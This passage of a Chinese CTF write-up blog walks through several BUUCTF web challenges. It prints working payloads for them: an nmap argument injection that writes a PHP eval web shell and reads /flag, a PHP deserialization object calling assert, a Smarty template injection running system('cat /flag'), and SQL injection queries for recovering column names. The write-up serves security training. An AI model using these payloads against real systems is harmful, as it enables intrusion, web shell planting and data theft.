            param <span class="token operator">=</span> a
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            param <span class="token operator">=</span> b
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'找到了利用文件： '</span> <span class="token operator">+</span> <span class="token builtin">file</span> <span class="token operator">+</span> <span class="token string">"  and 找到了利用的参数：%s"</span> <span class="token operator">%</span> param<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'结束时间：  '</span> <span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>  <span class="token comment"># 加入多线程</span>
    t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>get_content<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token triple-quoted-string string">"""threading.Thread() 是 threading 模块中用于创建线程对象的类。
target=get_content：指定线程要执行的目标函数，即 get_content 函数。当线程启动后，会调用这个函数来完成具体的任务。
args=(i,)：传递给目标函数的参数。args 是一个元组，这里将当前文件名称 i 作为参数传递给 get_content 函数。注意，即使只有一个参数，也需要写成元组的形式，后面的逗号不能省略。"""</span>
    t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 调用线程对象 t 的 start() 方法，该方法会启动线程并开始执行 target 指定的函数（即 get_content</span>
    <span class="token comment"># 函数）。线程会在后台独立运行，不会阻塞主线程的执行，从而实现多线程并发处理多个文件的目的。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/96c3955e1ad9562ad539e67f736eeda9.png"></p>
<pre class="line-numbers language-none"><code class="language-none">/xk0SzyKwfzw.php?Efa5BVG=cat /flag
flag{ed497ec8-a905-4882-9f8b-bb22ffd3c9e7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>还有就是要注意echo的线索要小小众些，不然会出现一堆可行的（</p>
<hr>
<h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7c69f9df7ebc863df09abd77bddd0b3f.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Warning: simplexml_load_file(): I/O warning : failed to load external entity "xml/34234" in /var/www/html/result.php on line 23
Wrong file name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HOsystem/p/16538678.html">Nmap 操作手册 - 完整版 - HOsystem - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yankaohaitaiwei/p/11593970.html">【渗透测试小白系列】之目录扫描、Nmap的使用及使用Metasploit通过MS17-010获取系统权限 - Woori - 博客园</a></p>
<p>来对比下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f48b3048b506f7be115558352aea1c1f.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/252d6fc0ab7cbcbd088efafd0c777eb5.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/088dcf83226ababff6ce04be14945ccf.png"></p>
<p>很明显前两更像，TCP+balabala…</p>
<p>故为nmap+IP形式</p>
<blockquote>
<pre class="line-numbers language-none"><code class="language-none">nmap -iL filename 扫描目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>-oN / -oX / -oS / -oG ：正常输出扫描，XML，s | &lt;rIpt kIddi3 和Grepable格式，分别为给定的文件名；</li>
<li>-oA ：一次输出三种主要格式；</li>
<li>nmap -oG <output_file> [其他扫描参数] &lt;目标主机或网络&gt;</output_file></li>
</ul>
</blockquote>
<p>一种是酱，参考[BUUCTF 2018]Online Tool[<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">浅谈escapeshellarg逃逸与参数注入  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/#escapeshellarg</a></p>
<pre class="line-numbers language-none"><code class="language-none">127.0.0.1' -iL /flag -oN xa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问xa’</p>
<p>但感觉不靠谱,我又不造源代码里有escapeshllarg什么的（</p>
<p>原来nmap可能和escapeshellarg()与escapeshellcmd()配合使用，那没事了</p>
<p>哇哦！！！！那以后nmap就靠这方面了。这两道题都是一个类型。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17705836.html">nmap和escapeshellarg()函数、escapeshellcmd()函数的RCE使用 - Eddie_Murphy - 博客园</a></p>
<p>遂把那题的payload搬过来<code>' 《?php @eval($_POST["pass"]);?&gt; -oG pass.php '</code></p>
<p><del>结果说我是Hacker(bushi</del></p>
<p>试了一会儿，好像是把php给ban了</p>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46607055/article/details/120076797">极客大挑战 2019]Upload——php短标签-CSDN博客</a>找见了喵~</p>
<blockquote>
<p>php短标签</p>
<!--? echo '123';?--><p>  #前提是开启配置参数short_open_tags=on<br><!--?=(表达式)?-->  等价于 <!--?php echo (表达式)?-->  #不需要开启参数设置<br>&lt;% echo ‘123’;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用</p>
<script language="php">echo '123'; </script> #不需要修改参数开关，但是只能在7.0以下可用。

</blockquote>
<p>遂用短标签=&gt;<code>' 《? @eval($_POST["pass"]);?&gt; -oG pass.phtml '</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/8f33f11801e63936ef912af978302d92.png"></p>
<p>okk~</p>
<hr>
<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p><del>蹦出来个大二维码吓死我了啊啊啊啊啊啊</del></p>
<p><del>而且报的时间是错的喵</del></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>百万前端的<span class="token constant">NPU</span>报时中心为您报时：<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"./time.php?source"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token constant">SCRIPT</span> language<span class="token operator">=</span>javascript<span class="token operator">&gt;</span>
<span class="token keyword">function</span> <span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
theTime <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"runClock()"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> today <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> display<span class="token operator">=</span> today<span class="token punctuation">.</span><span class="token function">toLocaleString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>status<span class="token operator">=</span><span class="token string">""</span><span class="token operator">+</span>display<span class="token operator">+</span><span class="token string">"大黑阔HELEN"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token function">runClock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token comment">#error_reporting(0);</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>喵的肿么越看越眼熟什么的。。。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试，但没反应。。。</p>
<p>换了个md5可，看来是把system给ban了。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lktop/p/13745752.html">PHP代码执行/命令执行总结 - lktop - 博客园</a></p>
<p><del>卒</del></p>
<blockquote>
<p>在 PHP 里，<code>assert()</code> 是一个用于断言的函数。它的作用是判断某个表达式是否为真，如果表达式为假，就会触发一个断言失败的错误。<code>assert()</code> 函数一般接收一个表达式作为参数，当这个表达式的计算结果为 <code>false</code> 时，会根据配置来决定是否抛出异常或者发出警告。</p>
<p>而 <code>phpinfo()</code> 函数的功能是输出 PHP 的配置信息，包含 PHP 版本、编译选项、加载的扩展、环境变量等诸多详细内容。该函数会将这些信息以 HTML 表格的形式输出到页面上，并且返回值为 <code>true</code>。</p>
<h3 id="代码执行情况"><a href="#代码执行情况" class="headerlink" title="代码执行情况"></a>代码执行情况</h3><p>当你执行 <code>assert(phpinfo())</code> 时，会有以下情况发生：</p>
<ol>
<li><strong><code>phpinfo()</code> 函数先执行</strong>：它会输出 PHP 的详细配置信息到页面上。</li>
<li><strong><code>assert()</code> 对 <code>phpinfo()</code> 的返回值进行判断</strong>：因为 <code>phpinfo()</code> 总是返回 <code>true</code>，所以 <code>assert()</code> 里的条件始终为真，断言不会失败，也就不会触发断言失败的错误。</li>
</ol>
</blockquote>
<p>无敌了</p>
<p><code>O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}</code></p>
<hr>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--Ah,really important,seriously. --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Unicorn shop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Don't be frustrated(沮丧的) by the same view,we've changed the challenge content.--&gt;</span>
<span class="token comment">&lt;!-- Bootstrap core CSS --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/bootstrap.min.css?v=ec3bb52a00e176a7181d454dffaea219<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Custom styles for this template --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/jumbotron-narrow.css?v=166844ff66a82256d62737c8a6fc14bf<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--We still have some surprise for admin.password--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- /container --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>试了试ID不太可控，price到有些说法。。。</p>
<p>看见了<strong>Unicode</strong>标签，遂试。找个比1337大的Unicode单个数字就可。</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/search?q=ten+thousand#characters">Search</a></p>
<p>找ten thousand+number即可。𐄫፼等</p>
<hr>
<p>嗯哼，先酱</p>
<hr>
<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><blockquote>
<p>Build With Smarty !</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11666">文章 - Smarty模板注入&amp;CVE-2017-1000480 - 先知社区</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3293de369c63d4fb011cc1d369f0921c.png"></p>
<p>嗯哼</p>
<p><code>{if system('cat /flag')}{/if}</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ff7432e2eaba9512e5e0d0b84b4578d7.png"></p>
<p>ez</p>
<hr>
<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>admin已有，注册个号广告可xss。猜测需登admin。</p>
<p>看见<!--待管理确认-->猜测和MysteryMessageBoard一样。。。</p>
<p><del>然后无果</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eff7b5aa7c44fa9a1ac3325615f6fabc.png"></p>
<p>终于！看来是sql(</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hhhhhhhhh85/article/details/121328475">【CTF】二次注入原理及实战-CSDN博客</a></p>
<p>总之就是进来又出去数据库。。。</p>
<p><code>-1 ' order by 1#</code></p>
<!--标题含有敏感词汇-->

<p><del>这题还有个无敌的地方，它广告有上限（还不能一次知道那些被ban了</del></p>
<p>or（=&gt;^’异或）,注释(=&gt;’单引号闭合)，空格都ban了<del>(so,information_schem哭辽)</del></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">origin_text <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>origin_text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema-安全KER - 安全资讯平台</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/q1stop/p/18024992">无列名sql注入 - qingshanboy - 博客园</a></p>
<blockquote>
<p>这道题目在buuoj上的复现是没办法用sys.schema来bypass information_schema的，原因是buuoj没有sys.schema_table_statistics_with_buffer这个数据库，但是比赛中是可以利用的。</p>
</blockquote>
<p><strong>join、using</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">join</span>用于合并两个表，<span class="token keyword">using</span>表示使用什么字段进行连接，用<span class="token keyword">using</span>指定了连接字段则查询结果只返回连接字段

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">as</span> c
<span class="token comment">#这里使用id进行连接，只会返回id列</span>
思路：利用<span class="token keyword">join</span>合并同一表，报错重复的列名，再利用<span class="token keyword">using</span>爆出所有的列名，<span class="token keyword">union</span> <span class="token keyword">select</span>需要前后查询的字段数一样，不然会报
这里将 <span class="token keyword">user</span> 表与自身进行连接（<span class="token keyword">join</span> <span class="token keyword">user</span>），并使用 id 字段进行连接（<span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>）。由于使用了 <span class="token keyword">USING</span>，结果集中只会包含 id 列（因为 id 是连接字段）。

<span class="token comment"># 得到 id 列名重复报错</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
这条语句尝试将 <span class="token keyword">user</span> 表中 id 等于 <span class="token number">1</span> 的记录（<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span>）与 <span class="token keyword">user</span> 表自身连接的结果（<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> c）进行 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 操作。
但是，由于 <span class="token keyword">user</span> 表自身连接时没有指定连接条件，会导致列名重复（因为两个 <span class="token keyword">user</span> 表都有相同的列名），从而报错。

<span class="token comment"># 得到 username 列名重复报错</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
这里在连接时使用了 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>，但 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 要求前后两个查询的字段数必须相同。
前面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> 会返回 <span class="token keyword">user</span> 表的所有列，而后面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c 由于 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> 的限制，只返回 id 列，字段数不一致，所以会报错。

<span class="token comment"># 得到 password 列名重复报错</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
同样，前面的查询返回所有列，后面的查询由于 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span> 只返回 id 和 username 列，字段数不一致，导致报错。

<span class="token comment"># 得到 user 表中的数据</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
这里通过 <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> 使得后面的查询返回的列与前面的查询 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> 返回的列数和列名一致（假设 <span class="token keyword">user</span> 表只有 id、username 和 password 列），从而可以成功执行 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> 操作，得到 <span class="token keyword">user</span> 表中的数据。

 <span class="token keyword">JOIN</span> 用于合并两个表的数据。在 <span class="token keyword">SQL</span> 中，有多种类型的 <span class="token keyword">JOIN</span>，如 <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span>、<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> 等。
<span class="token keyword">USING</span> 是 <span class="token keyword">JOIN</span> 的一种子句，它用于指定连接两个表所依据的列。当使用 <span class="token keyword">USING</span> 指定连接字段时，查询结果中只会包含该连接字段一次（因为在两个表中该字段是相同的），而不是像普通 <span class="token keyword">JOIN</span> 那样可能出现重复的列名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后发现join被ban了（</p>
<p><del>呃（吐血</del></p>
<p><strong>Q</strong>又试了试其他的方法都不行（我认为是它们最后有；的原因？），遂试<strong>子查询</strong></p>
